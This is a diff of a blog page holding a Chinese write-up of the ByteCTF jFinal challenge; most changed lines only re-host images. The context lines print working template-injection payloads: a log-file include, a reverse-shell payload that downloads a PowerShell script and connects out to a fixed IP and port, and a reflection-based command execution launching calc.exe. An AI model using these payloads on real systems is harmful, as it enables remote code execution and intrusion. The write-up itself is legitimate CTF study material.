@@ -13,17 +13,17 @@
 <meta property="og:site_name" content="Yenan&#39;s blog">
 <meta property="og:description" content="ByteCTF jFinal1.配置本地环境看sql语句没新建数据库，先创建一个database名为jfinal_blog  1create database jfinal_blog;  改变&#x2F;config&#x2F;app-config-dev.txt里面的mysql密码为本地mysql的:  在mysql的shell中，导入后缀为.sql的文件 1source jfinal_blog.sql  启动环境">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211021153438506.png">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211017212844151.png">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/634c4d64-98f8-4a80-b1d0-9ec3e8d99786.png">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/2bd050be-f23d-4186-8bea-ceacf49eaf9a.png">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/7cd60cd3-5e55-4c39-9fb7-8859dee2a768.png">
-<meta property="og:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/8a7373ee-99ea-4346-8845-d6b221e0f0db.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/image-20211021153438506-16481746061497.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/image-20211017212844151-16481746061509.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/634c4d64-98f8-4a80-b1d0-9ec3e8d99786-164817460615011.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/2bd050be-f23d-4186-8bea-ceacf49eaf9a-164817460615013.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/7cd60cd3-5e55-4c39-9fb7-8859dee2a768-164817460615015.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/8a7373ee-99ea-4346-8845-d6b221e0f0db-164817460615017.png">
 <meta property="article:published_time" content="2022-03-25T02:12:49.000Z">
-<meta property="article:modified_time" content="2022-03-25T02:14:04.458Z">
+<meta property="article:modified_time" content="2022-03-25T02:20:30.958Z">
 <meta property="article:author" content="Yenan">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/ByteCTF-jFinal.assets/image-20211021153438506.png">
+<meta name="twitter:image" content="https://gitee.com/DuWA/blog/raw/master/img/image-20211021153438506-16481746061497.png">
     
     
       
@@ -151,7 +151,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database jfinal_blog;</span><br></pre></td></tr></table></figure>
 
 <p>改变<code>/config/app-config-dev.txt</code>里面的mysql密码为本地mysql的:</p>
-<p><img src="ByteCTF-jFinal.assets/image-20211021153438506.png" alt="image-20211021153438506"></p>
+<p><img src="https://gitee.com/DuWA/blog/raw/master/img/image-20211021153438506-16481746061497.png" alt="image-20211021153438506"></p>
 <p>在mysql的shell中，导入后缀为<code>.sql</code>的文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source jfinal_blog.sql</span><br></pre></td></tr></table></figure>
 
@@ -162,7 +162,7 @@
 <p>这里看ipconfig后得知本机ip是<code>192.168.43.252</code>，所以访问<code>http://192.168.43.252:30000/</code>然后开一般的代理就能抓到包。</p>
 <h3 id="2-题目环境打通"><a href="#2-题目环境打通" class="headerlink" title="2.题目环境打通"></a>2.题目环境打通</h3><p><code>/admin</code>路由 后台默认弱口令 <code>jFinal  111111</code></p>
 <p>审计+黑盒，发现新建博客的内容编辑处有ssti，ssti的poc是 <code>#(2*2)</code> 就会被渲染为 <code>4</code></p>
-<img src="ByteCTF-jFinal.assets/image-20211017212844151.png" alt="image-20211021150956578" style="zoom: 67%;" />
+<img src="https://gitee.com/DuWA/blog/raw/master/img/image-20211017212844151-16481746061509.png" alt="image-20211021150956578" style="zoom: 67%;" />
 
 
 
@@ -187,18 +187,18 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blog.title=123&amp;blog.content=#render(&quot;../log/jfinal-blog.log&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>发现别人的payload，这里应该是别人打错了才会抛出错误类型和源语句，打通的话不保留的：</p>
-<p><img src="ByteCTF-jFinal.assets/634c4d64-98f8-4a80-b1d0-9ec3e8d99786.png"></p>
+<p><img src="https://gitee.com/DuWA/blog/raw/master/img/634c4d64-98f8-4a80-b1d0-9ec3e8d99786-164817460615011.png"></p>
 <p>读log的完整报文：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.252:30000</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.43.252:30000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.43.252:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=f0b56f4cce334eda98d7d243da59d538</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-leaf">blog.title=123&amp;blog.content=<span class="function"><span class="keyword">#</span><span class="title">include</span><span class="params">(<span class="string">&quot;../log/jfinal-blog.log&quot;</span>)</span></span></span></span><br></pre></td></tr></table></figure>
 
-<img src="ByteCTF-jFinal.assets/2bd050be-f23d-4186-8bea-ceacf49eaf9a.png" style="zoom: 67%;" />
+<img src="https://gitee.com/DuWA/blog/raw/master/img/2bd050be-f23d-4186-8bea-ceacf49eaf9a-164817460615013.png" style="zoom: 67%;" />
 
 <p>这个选手为什么能考虑到需要去反射绕过呢，代码审计看到，因为这里有springsecurity机制：</p>
-<p><img src="ByteCTF-jFinal.assets/7cd60cd3-5e55-4c39-9fb7-8859dee2a768.png"></p>
+<p><img src="https://gitee.com/DuWA/blog/raw/master/img/7cd60cd3-5e55-4c39-9fb7-8859dee2a768-164817460615015.png"></p>
 <p>学习这里的姿势： <a target="_blank" rel="noopener" href="https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</a>  但题目没有这个库：<code>org.apache.commons.lang3.reflect.ConstructorUtils::invokeConstructor</code></p>
 <p>在代码审计中发现一处类的调用 <code>ClassLoaderUtil </code></p>
 <p>也就是 <code>net.sf.ehcache.util.ClassLoaderUtil::createNewInstance</code></p>
-<p><img src="ByteCTF-jFinal.assets/8a7373ee-99ea-4346-8845-d6b221e0f0db.png"></p>
+<p><img src="https://gitee.com/DuWA/blog/raw/master/img/8a7373ee-99ea-4346-8845-d6b221e0f0db-164817460615017.png"></p>
 <p>但上述博客后面的方法可以参考： <a target="_blank" rel="noopener" href="https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</a> 文章结尾处</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(x=(java.net.URLClassLoader::getSystemClassLoader()).loadClass(&quot;javax.script.ScriptEngineManager&quot;))</span><br><span class="line">#set(payload=&quot;powershell -nop -exec bypass -c \\&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 7777\\&quot;&quot;)</span><br><span class="line">#set(poc=&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;+payload+&quot;\&quot;)&quot;)</span><br><span class="line">#((org.apache.commons.lang3.reflect.ConstructorUtils::invokeConstructor(x)).getEngineByExtension(&quot;js&quot;).eval(poc))</span><br></pre></td></tr></table></figure>
 
@@ -226,9 +226,6 @@
 
 <p>如果不换行，触发log则会记录完整的payload，会让别人蹭车:</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.252:30000</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>760</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.43.252:30000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.43.252:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=f0b56f4cce334eda98d7d243da59d538</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">blog.<span class="attribute">title</span>=<span class="variable">$&#123;&#123;123&#125;</span>&#125;&amp;blog.<span class="attribute">content</span>=#set(poc=&quot;var clz = Java.type(<span class="string">&#x27;java.lang.String[]&#x27;</span>).class;var rclz = Java.type(<span class="string">&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;</span>).class;var bclz = Java.type(<span class="string">&#x27;boolean&#x27;</span>).class;var pclz = Java.type(<span class="string">&#x27;java.lang.ProcessImpl&#x27;</span>).class;var cmd = java.lang.reflect.Array.newInstance(java.lang.String.class,3);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,0,<span class="string">&#x27;cmd&#x27;</span>);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,1,<span class="string">&#x27;/c&#x27;</span>);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,2,<span class="string">&#x27;calc.exe&#x27;</span>);var m = pclz.getDeclaredMethod(<span class="string">&#x27;start&#x27;</span>, clz, java.util.Map.class, java.lang.String.class, rclz, bclz);m.setAccessible(<span class="literal">true</span>);<span class="built_in">print</span>(m);m.invoke(<span class="literal">null</span>,cmd,  <span class="literal">null</span>, <span class="literal">null</span>,<span class="literal">null</span> ,<span class="literal">false</span>)<span class="string">&#x27;;&quot;)</span></span></span><br><span class="line"><span class="string"><span class="language-routeros">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&#x27;</span>js<span class="string">&#x27;).eval(poc))</span></span></span><br></pre></td></tr></table></figure>
-
-
-
 
   </div>
 </article>
